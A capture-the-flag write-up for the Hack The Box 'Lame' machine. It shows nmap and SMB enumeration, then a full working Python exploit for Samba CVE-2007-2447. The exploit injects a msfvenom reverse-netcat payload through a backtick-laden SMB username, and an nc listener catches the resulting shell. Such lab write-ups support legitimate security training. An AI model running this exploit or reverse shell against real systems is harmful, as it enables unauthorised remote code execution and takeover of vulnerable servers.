---
layout: single
title: Lame - Hack The Box
excerpt: "Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement."
date: 2025-05-26
classes: wide
header:
  teaser: /img2/lame.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Samba 3.0.20 < 3.0.25rc3 - Username Map Script [Command Execution]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.3
```

![](/img2/Pasted%20image%2020250526213420.png)

- Vulnerability and version scan

```bash
nmap -sCV -p21,22,139,445,3632 -vvv 10.10.10.3
```

![[Pasted image 20250526213902.png]]

- SMB enumeration

```bash
smbmap -H 10.10.10.3
```

![](/img2/Pasted%20image%2020250526215557.png)



## Exploitation

- Samba smbd 3.0.20-Debian (CVE-2007-2447)

https://github.com/n3rdh4x0r/CVE-2007-2447

```python
#!/usr/bin/python3
#exploit Samba smbd 3.0.20-Debian
from smb import *
from smb.SMBConnection import *
from subprocess import getoutput
import argparse


def generate_payload(lh, lp):
	payload = getoutput(f"msfvenom -p cmd/unix/reverse_netcat LHOST={lh} LPORT={lp} -f python 2>/dev/null | tail -n +1")
	#print(type(lh), type(lp))
	final_cmd = (payload)
	#print(final_cmd)
	"""
	in case of a print statement
	def get_payload():
	    tmp = sys.stdout
	    sys.stdout = StringIO()
	    exec(msfvenom() + "\nprint(buf)")
	    buf = sys.stdout.getvalue()
	    # restore stdout
	    sys.stdout = tmp
	    return buf
	    thanks to @Tony_Bamanaboni#0789 on discord
	"""

	l = {}
	exec(final_cmd, {}, l)
	return l["buf"] 
	


def main():
	parser = argparse.ArgumentParser(description = "Exploit Samba smbd 3.0.20-Debian CVE-2007-2447")
	parser.add_argument("-lh", type=str, help="LHOST -> attacker", required=True)
	parser.add_argument("-lp", type=str, help="LPORT -> attacker port", required=True)
	parser.add_argument("-t", type=str, help="target -> target ip", required=True)
	parser.usage = parser.format_help()
	args = parser.parse_args()

	
	#buf = generate_payload("10.10.14.170", 1337)
	buf = generate_payload(args.lh, int(args.lp)).decode()

	#print(f"here take the output biatch: {buf}")
	#exit(-1)
	print("Payload created & now sending it....")

	userID = "/=` nohup " + buf + "`"
	password = "password"
	victim_ip = args.t

	conn = SMBConnection(userID, password, "HELLO", "TEST", use_ntlm_v2=False)
	conn.connect(victim_ip, 445)


if __name__ == '__main__':
	main()
```

```bash
python3 exploit.py -lh 10.10.16.7 -lp 9000 -t 10.10.10.3
```

```bash
nc -nlvp 9000
```

![](/img2/Pasted%20image%2020250526215307.png)